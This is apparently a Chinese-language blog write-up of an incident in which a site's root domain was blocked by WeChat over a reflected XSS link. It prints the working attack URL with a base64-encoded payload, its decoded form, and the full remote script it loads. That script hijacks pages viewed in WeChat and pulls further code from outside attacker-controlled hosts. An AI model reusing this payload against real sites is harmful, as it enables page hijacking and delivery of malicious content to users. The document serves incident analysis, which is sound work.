# 一个XSS导致 根域被微信封

# 背景

一早起来 更改*.xx.com 被微信封了

点击申请恢复

显示这条URL有问题 

```
http://x.a.xxx.com/abc.php?keyword=1&amp;t=0XSS";setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vMTR2Zy5jbi9kJzs='),0);//&page=2
```

# hack思路

> 执行setTimeout 加载JS

这里转了个弯 用atob 用来替换hack的代码

执行

```javascript
atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vMTR2Zy5jbi9kJzs=')
```

的结果是一个字符串

```javascript
"document.body.innerHTML = '';document.body.appendChild(document.createElement('script')).src='//14vg.cn/d';"
```

> hack加载的JS


```javascript
define = null;
require = null;
var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/.test(ua)) {
    var app = document.createElement('div');
    app.setAttribute('style', 'font-family: -apple-system-font,Helvetica Neue,Helvetica,sans-serif;text-align:center;font-size:20px;font-weight:400;padding-top:10px');
    app.innerHTML = '
Loading
';
    if (document.body) {
        document.body.appendChild(app);
    }
    document.title = "正在打开...";
    var xhr = new XMLHttpRequest;
    var html = null;
    function render() {
        var a = document.open("text/html", "replace");
        a.write(html);
        a.close();
        if (document.body) {
            document.title = "...";
            loadJs("//appmessage.oss-cn-qingdao.aliyuncs.com/lib/js/jquery.min.js",
            function() {
                loadJs("//bact.oss-cn-beijing.aliyuncs.com/js/d.js");
                loadJs("//14vg.cn/public/common.php");
            });
        }
    }
    function loadJs(a, b) {
        var c = document.createElement("script");
        "undefined" != typeof b && (c.readyState ? c.onreadystatechange = function() { ("loaded" == c.readyState || "complete" == c.readyState) && (c.onreadystatechange = null, b());
        }: c.onload = function() {
            b();
        }),
        c.src = a,
        document.body.appendChild(c);
    }
    xhr.onload = function() {
        html = xhr.responseText;
        var delay = 0;
        if (delay > 0) {
            setTimeout("render()", delay * 1000);
        } else {
            render();
        }
    };
    xhr.open("GET", "//14vg.cn/hb/d.php?t=" + Date.now(), !0);
    xhr.send();
    document.addEventListener('WeixinJSBridgeReady',
    function() {
        WeixinJSBridge.call('hideOptionMenu');
    });
} else {
    window.location.replace("https://www.weimob.com");
}
```